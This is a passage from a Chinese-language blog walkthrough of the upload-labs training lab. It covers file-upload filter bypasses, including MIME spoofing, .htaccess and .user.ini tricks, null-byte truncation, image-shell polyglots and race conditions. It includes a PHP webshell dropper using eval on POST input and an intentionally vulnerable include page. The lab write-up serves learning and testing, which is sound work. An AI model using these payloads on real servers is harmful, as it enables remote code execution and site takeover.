href="https://www.zhaosimeng.cn/writeup/72.html">upload-labs</a></p><p>jpg也是运用脚本，先上传一张图片在将图片下载至本地用脚本运行再重新上传即可，脚本依旧再上面的链接里。二次渲染就结束啦~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>upload-labs</title>
    <link href="/2021/01/24/upload/"/>
    <url>/2021/01/24/upload/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#pass-01%E5%89%8D%E7%AB%AFjs%E7%BB%95%E8%BF%87">Pass-01(前端js绕过)</a><ul><li><a href="#%E5%88%A0%E9%99%A4js%E6%A0%A1%E9%AA%8C%E4%BB%A3%E7%A0%81">删除js校验代码</a></li><li><a href="#%E6%9B%B4%E6%94%B9js%E6%A0%A1%E9%AA%8C%E4%B8%AD%E7%9A%84%E7%99%BD%E5%90%8D%E5%8D%95">更改js校验中的白名单</a></li><li><a href="#%E5%85%88%E6%94%B9%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D%E9%80%9A%E8%BF%87js%E6%A0%A1%E9%AA%8C%E5%86%8D%E6%8A%93%E5%8C%85%E6%9B%B4%E6%94%B9%E5%90%8E%E7%BC%80%E4%B8%8A%E4%BC%A0%E8%87%B3%E6%9C%8D%E5%8A%A1%E5%99%A8">先改文件后缀名通过js校验再抓包更改后缀上传至服务器</a></li></ul></li><li><a href="#pass-02mime%E9%AA%8C%E8%AF%81">Pass-02(MIME验证)</a></li><li><a href="#pass-03%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87">Pass-03(黑名单绕过)</a></li><li><a href="#pass-04%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-htaccess">Pass-04(黑名单绕过-.htaccess)</a></li><li><a href="#pass-05%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81userini">Pass-05（黑名单验证，.user.ini.）</a></li><li><a href="#pass-06%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87">Pass-06(黑名单验证-大小写绕过)</a></li><li><a href="#pass-07%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87">Pass-07(黑名单验证–空格绕过)</a></li><li><a href="#pass-08%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%82%B9%E5%8F%B7%E7%BB%95%E8%BF%87">Pass-08（黑名单验证–点号绕过）</a></li><li><a href="#pass-09%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6data%E7%BB%95%E8%BF%87">Pass-09(黑名单验证–特殊字符::$DATA绕过)</a></li><li><a href="#pass-10%E9%BB%91%E5%90%8D%E5%8D%95-%E5%8D%95%E6%AC%A1%E5%A4%84%E7%90%86">Pass-10（黑名单-单次处理）</a></li><li><a href="#pass-11%E9%BB%91%E5%90%8D%E5%8D%95-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87">Pass-11（黑名单-双写绕过)</a></li><li><a href="#pass-12%E7%99%BD%E5%90%8D%E5%8D%95-0x00%E6%88%AA%E6%96%AD-get%E5%9E%8B">Pass-12（白名单-0x00截断-GET型)</a></li><li><a href="#pass-13%E7%99%BD%E5%90%8D%E5%8D%95-0x00%E6%88%AA%E6%96%AD-post%E5%9E%8B">Pass-13（白名单-0x00截断-POST型)</a></li><li><a href="#pass-14%E7%99%BD%E5%90%8D%E5%8D%95-%E5%9B%BE%E7%89%87%E9%A9%AC">Pass-14（白名单-图片马)</a></li><li><a href="#pass-15%E7%99%BD%E5%90%8D%E5%8D%95-%E5%9B%BE%E7%89%87%E9%A9%AC-getimagesize">Pass-15(白名单-图片马-getimagesize())</a></li><li><a href="#pass-16%E7%99%BD%E5%90%8D%E5%8D%95-%E5%9B%BE%E7%89%87%E9%A9%AC-exif_imagetype">Pass-16(白名单-图片马-exif_imagetype())</a></li><li><a href="#pass-17%E7%99%BD%E5%90%8D%E5%8D%95-%E5%9B%BE%E7%89%87%E9%A9%AC-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93">Pass-17(白名单-图片马-二次渲染)</a></li><li><a href="#pass-18%E7%99%BD%E5%90%8D%E5%8D%95-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-%E6%97%B6%E9%97%B4">Pass-18（白名单-条件竞争-时间)</a></li><li><a href="#pass-19%E7%99%BD%E5%90%8D%E5%8D%95-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-%E5%9B%BE%E7%89%87%E9%A9%AC">Pass-19（白名单-条件竞争-图片马)</a></li><li><a href="#pass-20%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81-%E7%82%B9%E5%8F%B7%E7%BB%95%E8%BF%87">Pass-20（黑名单验证-点号绕过……)</a></li><li><a href="#pass-21%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87">Pass-21（白名单验证-数组绕过)</a></li><li><a href="#%E6%80%BB%E7%BB%93">总结</a><h2 id="文件上传漏洞介绍"><a href="#文件上传漏洞介绍" class="headerlink" title="文件上传漏洞介绍"></a>文件上传漏洞介绍</h2></li></ul><p>web应用程序通常带有文件上传的功能，比如在博客发表文章需要上传图片等行为就可能存在文件上传漏洞。文件上传漏洞就是利用网页代码中的文件上传路径变量过滤不严将可执行的文件上传到一个到服务器中，再通过URL去访问以执行恶意代码。攻击者可以直接上传WebShell（以asp、php或者jsp等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门）到服务器上。详情：<a href="https://segmentfault.com/a/1190000016012608">文件上传漏洞</a></p><p>共有以下几种类型：</p><p><img src="/2021/01/24/upload/2.jpg" alt="2"></p><p>（做了m久的思维导图………)</p><h1 id="Pass-01-前端js绕过"><a href="#Pass-01-前端js绕过" class="headerlink" title="Pass-01(前端js绕过)"></a>Pass-01(前端js绕过)</h1><p>页面要求上传webshell，随意写一个php上传(一句话木马在本地端不直观)后：</p><img src="/2021/01/24/upload/1.jpg" alt="1" style="zoom:67%;"><p>查看源码发现为js前端验证，且定义了一个白名单，只让图示几种格式通过。js前端验证有以下几种思路：</p><p>1、删除js校验代码</p><p>2、更改js校验中的白名单</p><p>3、先改文件后缀名通过js校验再抓包更改后缀上传至服务器</p><h3 id="删除js校验代码"><a href="#删除js校验代码" class="headerlink" title="删除js校验代码"></a>删除js校验代码</h3><p>本来可以在firebug进行删改，新版火狐没有这个插件了，只能通过源代码或者抓包进行删改了。将验证函数删除即可：</p><p><img src="/2021/01/24/upload/4.jpg" alt="4"></p><h3 id="更改js校验中的白名单"><a href="#更改js校验中的白名单" class="headerlink" title="更改js校验中的白名单"></a>更改js校验中的白名单</h3><p>将PHP格式加上：</p><p><img src="/2021/01/24/upload/3.jpg" alt="3"></p><h3 id="先改文件后缀名通过js校验再抓包更改后缀上传至服务器"><a href="#先改文件后缀名通过js校验再抓包更改后缀上传至服务器" class="headerlink" title="先改文件后缀名通过js校验再抓包更改后缀上传至服务器"></a>先改文件后缀名通过js校验再抓包更改后缀上传至服务器</h3><p>先将PHP后缀改为jpg格式的图片，上传时进行抓包拦截，再修改后缀:</p><p><img src="/2021/01/24/upload/6.jpg" alt="6"></p><p>上传成功~~</p><p><img src="/2021/01/24/upload/5.jpg" alt="5"></p><h1 id="Pass-02-MIME验证"><a href="#Pass-02-MIME验证" class="headerlink" title="Pass-02(MIME验证)"></a>Pass-02(MIME验证)</h1><p>提示显示进行MIME校验：</p><p>MIME(Multipurpose Internet Mail  Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。在HTTP中，MIME类型被定义在Content-Type header中。</p><p>常见类型：</p><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">audio</span>/mpeg -&gt;</span> .mp3<span class="hljs-function"><span class="hljs-title">application</span>/msword -&gt;</span> .doc<span class="hljs-function"><span class="hljs-title">application</span>/octet-stream -&gt;</span> .exe<span class="hljs-function"><span class="hljs-title">application</span>/pdf -&gt;</span> .pdf<span class="hljs-function"><span class="hljs-title">application</span>/x-javascript -&gt;</span> .js<span class="hljs-function"><span class="hljs-title">application</span>/x-rar -&gt;</span> .rar<span class="hljs-function"><span class="hljs-title">application</span>/zip -&gt;</span> .zip<span class="hljs-function"><span class="hljs-title">image</span>/gif -&gt;</span> .gif<span class="hljs-function"><span class="hljs-title">image</span>/jpeg -&gt;</span> .jpg / .jpeg<span class="hljs-function"><span class="hljs-title">image</span>/png -&gt;</span> .png<span class="hljs-function"><span class="hljs-title">text</span>/plain -&gt;</span> .txt<span class="hljs-function"><span class="hljs-title">text</span>/html -&gt;</span> .html<span class="hljs-function"><span class="hljs-title">video</span>/mp4 -&gt;</span> .mp4</code></pre><p>查看源码：</p><p><img src="/2021/01/24/upload/7.jpg" alt="7"></p><p>本关类型是image/jpeg、image/png、image/gif中的任何一种就允许上传，否则就提示文件类型不正确。当上传一个PHP时，MIME类型不符合服务器端的要求，上传就会失败。pass-01中先改文件后缀名通过js校验再抓包更改后缀上传至服务器的方法一样可行。</p><p>另一种方法是改MIME类型：</p><p>上传PHP，抓包将MIME类型改为服务器允许的，原理是绕过了服务器端对MIME的检测并成功将shell上传。</p><p><img src="/2021/01/24/upload/8.jpg" alt="8"></p><h1 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03(黑名单绕过)"></a>Pass-03(黑名单绕过)</h1><p>查看提示：</p><img src="/2021/01/24/upload/9.jpg" alt="9" style="zoom:50%;"><p>本关属于黑名单验证</p><pre><code class="hljs jboss-cli">黑名单过滤的缺点：    攻击者可以从黑名单中找到Web开发者忽略的扩展名    没有进行大小写转换，诸如<span class="hljs-string">.PHP</span>扩展名不在黑名单里，依旧会被服务器接收    windows系统下，如果文件名以<span class="hljs-string">&quot;.&quot;</span>或空格结尾会自动取出。asp.转化为asp</code></pre><p>本关将常用脚本语言的shell文件后缀全部禁止，Apache解析顺序是从右到左开始解析文件后缀，如果最右侧扩展名不能识别的话，就继续往左判断，直到遇到可以解析的文件后缀为止。而且Apache的httpd.conf中可以进行配置，规定哪些文件后缀是以php格式来解析的。本关的解法就从这得来，尝试用php3,phtml绕过：</p><p>一样先抓包，改后缀名，本关上传一句话木马，因为通过这种方式上传的文件服务器会修改文件名，故蚁剑连接时文件名记得换。</p><h1 id="Pass-04-黑名单绕过-htaccess"><a href="#Pass-04-黑名单绕过-htaccess" class="headerlink" title="Pass-04(黑名单绕过-.htaccess)"></a>Pass-04(黑名单绕过-.htaccess)</h1><p>查看提示黑名单有点多，但是漏掉了Apache服务器的一个配置文件.htaccess。所以这关的思路就是<strong>先上传一个htaccess文件，写入规则让服务器把指定的文件格式按照php的格式解析。然后就上传指定文件格式的文件（不在黑名单中的）进行测试。</strong></p><p>文件要写入：SetHandler application/x-httpd-php(让Apache对当前目录中的所有文件都以php的格式进行解析).上传，抓包:</p><p><img src="/2021/01/24/upload/10.jpg" alt="10"></p><p>再将shell改一下拓展名，上传即可。</p><h1 id="Pass-05（黑名单验证，-user-ini-）"><a href="#Pass-05（黑名单验证，-user-ini-）" class="headerlink" title="Pass-05（黑名单验证，.user.ini.）"></a>Pass-05（黑名单验证，.user.ini.）</h1><p><img src="/2021/01/24/upload/11.jpg" alt="11"></p><p>本关可以利用ini配置文件进行上传，先上传以<code>auto_prepend_file=1.jpg</code>为内容的<code>.user.ini</code>文件（<strong>所有的php文件都自动包含1.jpg文件。.user.ini相当于一个用户自定义的php.ini</strong>）然后再上传一句话的脚本，命名为<code>1.jpg</code>。访问即可。</p><h1 id="Pass-06-黑名单验证-大小写绕过"><a href="#Pass-06-黑名单验证-大小写绕过" class="headerlink" title="Pass-06(黑名单验证-大小写绕过)"></a>Pass-06(黑名单验证-大小写绕过)</h1><p>查看源代码可知无大小写转换，将文件名后缀直接改成Php,大小写混合的格式即可。</p><h1 id="Pass-07-黑名单验证–空格绕过"><a href="#Pass-07-黑名单验证–空格绕过" class="headerlink" title="Pass-07(黑名单验证–空格绕过)"></a>Pass-07(<strong>黑名单验证–空格绕过</strong>)</h1><p>从源码中可以看到，服务器端对文件后缀名仅仅是进行了去除末尾的”.”以及小写转换操作。但是并没有进行去除空格的操作,(<strong>windows系统中会将文件扩展名后的空格做空处理，防止文件被当成另一种不可识别的文件类型。故可利用这个特性来绕过这一关的黑名单</strong>)直接上传，抓包，加空格，访问。</p><h1 id="Pass-08（黑名单验证–点号绕过）"><a href="#Pass-08（黑名单验证–点号绕过）" class="headerlink" title="Pass-08（黑名单验证–点号绕过）"></a>Pass-08（黑名单验证–点号绕过）</h1><p>观察代码，没有进行点号去除(<strong>windows系统对于文件后缀名后面跟的”.”会自动去除，不管是添加一个还是多个效果都是一样的</strong>)，利用此点，抓包，加点。</p><h1 id="Pass-09-黑名单验证–特殊字符-DATA绕过"><a href="#Pass-09-黑名单验证–特殊字符-DATA绕过" class="headerlink" title="Pass-09(黑名单验证–特殊字符::$DATA绕过)"></a>Pass-09(黑名单验证–特殊字符::$DATA绕过)</h1><p>代码少了对<code>::$DATA</code>的处理</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">DATA</span><span class="hljs-params">(NTFS文件系统的存储数据流的一个属性)</span><span class="hljs-title">NTFS</span></span>文件系统包括对备用数据流的支持,备用数据流允许文件包含多个数据流，每个文件至少有一个数据流。在Windows中，这个默认数据流称为：<span class="hljs-variable">$DATA</span>,当我们访问<span class="hljs-number">1</span><span class="hljs-selector-class">.php</span>::<span class="hljs-variable">$DATA</span> 时，就是请求 <span class="hljs-number">1</span><span class="hljs-selector-class">.php</span> 本身的数据，如果<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.php</span> 还包含了其他的数据流，比如<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.php</span>:lake2.php，请求<span class="hljs-number">1</span><span class="hljs-selector-class">.php</span>:lake2<span class="hljs-selector-class">.php</span>::<span class="hljs-variable">$DATA</span>，则是请求<span class="hljs-number">1</span>.php中的流数据lake2.php的流数据内容。</code></pre><p>故本关可解：抓包，改后缀(加上::$DATA)，访问(<strong>服务器端会对文件进行重命名,且文件为正常的php文件，故一样可用蚁剑连接</strong>)</p><h1 id="Pass-10（黑名单-单次处理）"><a href="#Pass-10（黑名单-单次处理）" class="headerlink" title="Pass-10（黑名单-单次处理）"></a>Pass-10（黑名单-单次处理）</h1><p>从源代码看，貌似前几关的漏洞都没有了，观察代码：</p><p><img src="/2021/01/24/upload/12.jpg" alt="12"></p><p>进行了一次删除<code>.</code>的操作就直接拼接到了上传目录的后面</p><p><img src="/2021/01/24/upload/13.jpg" alt="13"></p><p>而前面几关都是做完所有的防绕过处理之后得到的文件名进行拼接的。所以我们只需构造一个<strong>经过所有的防绕过操作之后不在黑名单中，并且经过去除末尾”.”号之后拼接还能被解析的后缀</strong>，故本关可在文件后缀加上<code>. .</code>一个点应付一次去点，一个空格应付一个去空格，这样就可以了</p><h1 id="Pass-11（黑名单-双写绕过"><a href="#Pass-11（黑名单-双写绕过" class="headerlink" title="Pass-11（黑名单-双写绕过)"></a>Pass-11（黑名单-双写绕过)</h1><p>本关的关键在str_ireplace（）函数</p><p>语法:</p><pre><code class="hljs reasonml">str<span class="hljs-constructor">_ireplace(<span class="hljs-params">find</span>,<span class="hljs-params">replace</span>,<span class="hljs-params">string</span>,<span class="hljs-params">count</span>)</span></code></pre><p>此函数用于替换字符串中的一些字符（不区分大小写），比如本关源代码中<code>str_ireplace($deny_ext,&quot;&quot;, $file_name)</code>便是将<strong>文件名中含有黑名单字符串的那一部分替换为空</strong>，具体用法：<a href="https://www.w3school.com.cn/php/func_string_str_ireplace.asp">str_irplace函数</a></p><p>利用此特性便可构造<code>.pphphp</code>后缀，当匹配到第一个p时不满足，匹配到第二个就能匹配到php且被去除，这里在匹配完成之后就不会对剩下的继续进行匹配了，因此剩下的p和hp自然就组合为了php。完美绕过str_ireplace（）函数的过滤。</p><h1 id="Pass-12（白名单-0x00截断-GET型"><a href="#Pass-12（白名单-0x00截断-GET型" class="headerlink" title="Pass-12（白名单-0x00截断-GET型)"></a>Pass-12（白名单-0x00截断-GET型)</h1><p>提示里说上传路径可控，查看源码，判断为白名单验证，但是路径可控是什么意思?</p><p>截断原理：chr()是一个用来返回参数所对应的字符的函数，故chr（）表示空，<strong>当一个字符串中存在空字符时，会导致空字符后面的字符被丢弃（误把它当成结束符），后面的数据直接忽略，这就导致漏洞产生</strong>，与之相关还有一个知识点：</p><pre><code class="hljs angelscript">%<span class="hljs-number">00</span>是对ascii码中的<span class="hljs-number">0</span>对应的字符编码后的结果，<span class="hljs-number">0x00</span>则是%<span class="hljs-number">00</span>解码成的<span class="hljs-number">16</span>进制。当url中的参数是通过GET方式获取时，%<span class="hljs-number">00</span>会被自动解码。当通过POST方式获取时，不会自动解码，%<span class="hljs-number">00</span>只会原样被当成字符串来输出。所以通过POST方式请求时，我们需要手动将它的十六进制改写为<span class="hljs-number">0x00</span>。</code></pre><p>截断还需满足 </p><ul><li>php 版本&lt;5.3.4 </li><li>php.ini中的magic_quotes_gpc是off状态(<strong>当magic_quotes_gpc开启时，所有的 单引号，双引号，反斜线和 NULL字符（%00）都会被自动加上一个反斜杠进行转义</strong>)</li></ul><p>上传，抓包，做如下修改：</p><p><img src="/2021/01/24/upload/14.jpg" alt="14"></p><h1 id="Pass-13（白名单-0x00截断-POST型"><a href="#Pass-13（白名单-0x00截断-POST型" class="headerlink" title="Pass-13（白名单-0x00截断-POST型)"></a>Pass-13（白名单-0x00截断-POST型)</h1><p>本关与上一关相似，上一关为GET方式本关为POST方式，前面讲了POST和GET的区别，故本关只需在上一关的基础上，将hex中空格的值由0d改成00即可</p><h1 id="Pass-14（白名单-图片马"><a href="#Pass-14（白名单-图片马" class="headerlink" title="Pass-14（白名单-图片马)"></a>Pass-14（白名单-图片马)</h1><p>提示说本关检查图标内容开头2个字节，查看源码，源码只检测文件头部2个字节信息，那它怎么知道文件类型？查阅资料发现，一般的文件前两个字节信息都能表明自己文件类型（用winhex察看图片的文件头）例如：</p><table><thead><tr><th>type</th><th>ExtensionsHeader</th></tr></thead><tbody><tr><td>jpeg</td><td>0xFFD8FF</td></tr><tr><td>png</td><td>0x89504E470D0A1A0A</td></tr><tr><td>gif</td><td>GIF8</td></tr><tr><td>tiff</td><td>0x49492A00 or 0x4D4D002A</td></tr><tr><td>Bit   map</td><td>BM</td></tr><tr><td>PC Paintbrush</td><td>0x0A050108</td></tr><tr><td>AOL ART</td><td>0x4A47040E000000 or 0x4A47030E000000</td></tr></tbody></table><p>本关所说的图片马就是把一张正常的图片和一个shell文件合在一起形成一个新的文件，可以把新的文件定义成图片。</p><p><img src="/2021/01/24/upload/15.jpg" alt="15"></p><p>上图为cmd方法制图片马。格式：<code>copy 1.jpg/b+1.php 2.jpg </code>（参数/b指定以二进制格式复制、合并文件(图片)，参数/a指定以ASCI1格式复制、合并文件( php文件)）.</p><p>但是一张图片不能被解析成php执行，故图片马不能直接上传。但是本关任务中第二点提到了使用<a href="http://127.0.0.1/upload-labs/include.php">文件包含漏洞</a>能运行图片马中的恶意代码。故我们可以新建一个文件包含漏洞页面来模拟真实环境。</p><p>在上传目录中新建一个include.php文件，写入如下代码 </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$file = $_GET[ <span class="hljs-string">&#x27;page&#x27;</span> ] ;<span class="hljs-keyword">include</span> ($file);<span class="hljs-meta">?&gt;</span></code></pre><p>再用蚁剑连接(<strong>jpg格式的文件无法直接与蚁剑连接，要借助文件包含获取已知的PHP，asp，aspx……文件来连接蚁剑</strong>)</p><p><img src="/2021/01/24/upload/16.jpg" alt="16"></p><h1 id="Pass-15-白名单-图片马-getimagesize"><a href="#Pass-15-白名单-图片马-getimagesize" class="headerlink" title="Pass-15(白名单-图片马-getimagesize())"></a>Pass-15(白名单-图片马-getimagesize())</h1><p>了解一下提示中提到的<code>getimagesize()</code>函数:</p><p>获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。语法格式：</p><pre><code class="hljs smali">array getimagesize ( string $filename [,<span class="hljs-built_in"> array </span>&amp;$imageinfo ] )</code></pre><p><code>getimagesize() </code>函数将测定任何 <code>GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP</code> 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。详情：<a href="https://www.runoob.com/php/php-getimagesize.html">getimagesize()函数</a></p><p>接下来在目录里创建一个php文件来测试该函数返回数组的各个值的含义。代码:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$local_jpg =<span class="hljs-string">&#x27;./00.jpg&#x27;</span>;$img_data = getimagesize($local_jpg);<span class="hljs-comment">//getimagesize()函数对本地图片00.jpg进行检查</span>var_dump($img_data );<span class="hljs-comment">//打印检查结果的数组</span><span class="hljs-meta">?&gt;</span></code></pre><p>运行：</p><p><img src="/2021/01/24/upload/17.jpg" alt="17"></p><p>索引的含义：</p><pre><code class="hljs angelscript">索引<span class="hljs-number">0</span> &gt;&gt;图像宽度的像素值索引<span class="hljs-number">1</span> &gt;&gt;图像高度的像素值索引<span class="hljs-number">2</span> &gt;&gt;图像的类型，<span class="hljs-number">1</span> = GIF，<span class="hljs-number">2</span> = JPG，<span class="hljs-number">3</span> = PNG，<span class="hljs-number">4</span> = SWF，<span class="hljs-number">5</span> = PSD，<span class="hljs-number">6</span> = BMP，<span class="hljs-number">7</span> = TIFF(<span class="hljs-built_in">int</span>el byte order)，<span class="hljs-number">8</span> = TIFF(motorola byte order)，<span class="hljs-number">9</span> = JPC，<span class="hljs-number">10</span> = JP2，<span class="hljs-number">11</span> = JPX，<span class="hljs-number">12</span> = JB2，<span class="hljs-number">13</span> = SWC，<span class="hljs-number">14</span> = IFF，<span class="hljs-number">15</span> = WBMP，<span class="hljs-number">16</span> = XBM索引<span class="hljs-number">3</span> &gt;&gt;一个宽度和高度的字符串索引 bits &gt;&gt;图像的每种颜色的位数，二进制格式索引 channels &gt;&gt;图像的通道值<span class="hljs-comment">//本次测试没有</span>索引 mime &gt;&gt;图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息</code></pre><p>源代码:</p><p><img src="/2021/01/24/upload/18.jpg" alt="18"></p><p>并未做其它更多的过滤操作，所以上一关的图片马依然可用。</p><h1 id="Pass-16-白名单-图片马-exif-imagetype"><a href="#Pass-16-白名单-图片马-exif-imagetype" class="headerlink" title="Pass-16(白名单-图片马-exif_imagetype())"></a>Pass-16(白名单-图片马-exif_imagetype())</h1><p>提示中换了一个函数：exif_imagetype()</p><pre><code class="hljs isbl">读取一个图像的第一个字节并检查其签名，恰当的签名则返回一个对应的常量，否则返回 <span class="hljs-variable"><span class="hljs-literal">FALSE</span></span>。返回值跟<span class="hljs-function"><span class="hljs-title">getimagesize</span>() 返回的数组中的索引 <span class="hljs-number">2</span> 的值是一样的(<span class="hljs-variable">pass</span>-<span class="hljs-number">15</span>中讲的)</span></code></pre><p>语法格式:</p><pre><code class="hljs awk">exif_imagetype ( string <span class="hljs-variable">$filename</span><span class="hljs-regexp">//</span>文件位置和名称)</code></pre><p>一样写个测试文件进行测试</p><p><img src="/2021/01/24/upload/19.jpg" alt="19"></p><p>函数貌似未定义，查找资料发现面板里的拓张没开</p><p><img src="/2021/01/24/upload/20.jpg" alt="20"></p><p>php.ini中extension=php_exif.dll前面的分号要去掉。在测试返回值为3，只检查了签名，图片马依旧可以。</p><h1 id="Pass-17-白名单-图片马-二次渲染"><a href="#Pass-17-白名单-图片马-二次渲染" class="headerlink" title="Pass-17(白名单-图片马-二次渲染)"></a>Pass-17(白名单-图片马-二次渲染)</h1><p>提示说渲染了图片？查看源码，使用了imagecreatefrom 系列函数来获取原文件的数据并创建一个新的图像文件，再重命名。 </p><p><code>imagecreatefromgif()</code>：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像 <code>imagecreatefromjpeg()</code>，<code>imagecreatefrompng()</code>等同理，这样看来图片渲染好像只是换了一个名字而已.</p><p>先用GIF试，先合成一个GIF的图片马，上传，访问</p><img src="/2021/01/24/upload/21.jpg" alt="21" style="zoom: 50%;"><p>额…小场面..不慌。上传成功却不能访问??需要去对比两个gif</p><p><img src="/2021/01/24/upload/22.jpg" alt="22"></p><p><img src="/2021/01/24/upload/23.jpg" alt="23"></p><p>发现服务器上文件末尾的php代码不见了，这应该就是渲染的作用。我们的目的是让服务器中的文件依然保存我们想要执行的代码，就需要去找渲染前后没有变化的位置，然后将php代码写进去(注意要将代码转化为对应进制编译器的进制数再写入),再上传就可以啦，不截图了。</p><p>但是本关的要求是图片马要<code>.jpg</code>,<code>.png</code>,<code>.gif</code>三种后缀都上传成功才算过关！png就不是这样了，要实现png二次渲染的绕过就需要深入了解png的格式。此部分再另一文章《二次渲染&amp;&amp;png结构分析》说明。</p><h1 id="Pass-18（白名单-条件竞争-时间"><a href="#Pass-18（白名单-条件竞争-时间" class="headerlink" title="Pass-18（白名单-条件竞争-时间)"></a>Pass-18（白名单-条件竞争-时间)</h1><p>提示说要代码审计，查看源码，源码解释得很清楚，先将上传的文件保存，然后将文件的后缀名同白名单对比，符合就将文件进行重命名。不符，unlink()函数就会删除该文件，虽然上传会被删除，但如果我们能在上传的一句话被删除之前访问就可以了。这个方法也叫条件竞争上传绕过。可以利用burp多线程发包，然后不断在浏览器访问代码，会有一瞬间的访问成功，通过burp一直不停的重放，会有一瞬间是还没来得及删除就可以被访问到的，一旦访问到该文件就会在当前目录下生成一句话。</p><p>上传的一句话：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-comment">//若访问到文件则在根目录里生成shell.php文件&#x27;<span class="hljs-meta">&lt;?php</span> @eval($_POST[&quot;test&quot;])<span class="hljs-meta">?&gt;</span>&#x27;);<span class="hljs-meta">?&gt;</span></span></code></pre><p>先上传，抓包，设置Null payloads也就是不设置payload。设置Continue indefinitely无限重放。</p><img src="/2021/01/24/upload/24.jpg" alt="24" style="zoom:50%;"><p>根目录出现shell.php,连接蚁剑</p><img src="/2021/01/24/upload/25.jpg" alt="25" style="zoom:50%;"><p>成功~~</p><h1 id="Pass-19（白名单-条件竞争-图片马"><a href="#Pass-19（白名单-条件竞争-图片马" class="headerlink" title="Pass-19（白名单-条件竞争-图片马)"></a>Pass-19（白名单-条件竞争-图片马)</h1><p>一样是代码审计，依次检查文件是否存在、文件名是否可写、检查后缀（白名单）、检查文件大小、检查临时文件存在、保存到临时目录里、然后再重命名。与Pass-18存在同样的条件竞争。不过这里先检查了后缀，所以要上传符合白名单里的文件才可以，只能用图片马了，而且需要在图片马没有被重命名之前访问它。本关可以沿用上一关的一句话木马，再用相同手段进行不断重放，也可以借助脚本进行不断访问。但这里还有一个有趣的解法：也可将php文件后缀名更改为.php.7z，因为白名单中允许上传.7z的文件，但是apache又不能解析这个格式而会把该文件当php的格式解析。</p><h1 id="Pass-20（黑名单验证-点号绕过……"><a href="#Pass-20（黑名单验证-点号绕过……" class="headerlink" title="Pass-20（黑名单验证-点号绕过……)"></a>Pass-20（黑名单验证-点号绕过……)</h1><p>查看代码</p><p><img src="/2021/01/24/upload/26.jpg" alt="26"></p><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>因为黑名单都是小写的形式，故可上传一个一句话木马然后将其命名为PHP形式后缀即可绕过</p><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>在<code>save_name</code>参数中文件名称后面加空格绕过</p><h4 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h4><p>还可以通过<code>save_name</code>参数来进行00截断，</p><p><img src="/2021/01/24/upload/27.jpg" alt="27"></p><h4 id="法四"><a href="#法四" class="headerlink" title="法四"></a>法四</h4><p>利用<code>pathinfo</code>函数</p><p>格式：</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">pathinfo</span><span class="hljs-params">(path,options)</span></span></code></pre><table><thead><tr><th align="center">参数</th><th>描述</th></tr></thead><tbody><tr><td align="center">path</td><td>必需。规定要检查的路径。</td></tr><tr><td align="center">process_sections</td><td>可选。规定要返回的数组元素。默认是 all。 可能的值：                  <code>PATHINFO_DIRNAME</code> //目录- 只返回<code>dirname   </code>                                                <code>PATHINFO_BASENAME</code> //文件加后缀名- 只返回 <code>basename  </code>                                  <code>PATHINFO_EXTENSION </code>//后缀名- 只返回 <code>extension </code></td></tr></tbody></table><p>和Pass-13类似，不过本关为黑名单，在文件保存的时候，加上<code>.</code>使得<code>pathinfo()</code>获取到的<code>PATHINFO_EXTENSION</code>为空，从而绕过黑名单。</p><h1 id="Pass-21（白名单验证-数组绕过"><a href="#Pass-21（白名单验证-数组绕过" class="headerlink" 